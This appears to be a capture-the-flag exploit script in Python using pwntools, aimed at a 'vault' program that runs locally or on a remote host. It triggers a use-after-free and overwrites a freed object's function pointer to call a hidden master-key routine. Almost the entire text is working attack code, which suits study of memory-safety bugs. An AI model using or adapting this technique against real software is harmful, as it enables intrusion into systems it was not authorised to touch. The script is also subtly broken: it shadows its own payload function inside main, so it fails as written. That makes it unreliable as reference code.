from pwn import *
import os
import sys

context.arch = "amd64"
context.log_level = "debug"

read_master_key = 0x4012D6


def payload() -> bytes:
    login_size = 32
    fake_login = p64(read_master_key) + b"A" * (login_size - 8)

    return b"".join([
        b"1\n",        # new login
        b"0\n",        # slot 0
        b"user\n",     # username
        b"pass\n",     # password
        b"2\n",        # delete login; leaves dangling pointer in logins[0]
        b"0\n",        # slot 0
        b"3\n",        # set password; malloc(32) reuses freed Login chunk
        b"32\n",       # same allocation size as sizeof(Login)
        fake_login,    # overwrite can_check function pointer
        b"\n4\n",      # check master key
        b"0\n",        # slot 0
        b"0\n",        # quit
    ])


def start():
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        return remote(host, port)

    exe = os.environ.get("VAULT", "./vault")
    return process(exe)


def main():
    io = start()

    payload = payload()
    io.send(payload)

    io.shutdown("send")

    result = io.recvall(timeout=5)
    sys.stdout.buffer.write(result)


if __name__ == "__main__":
    main()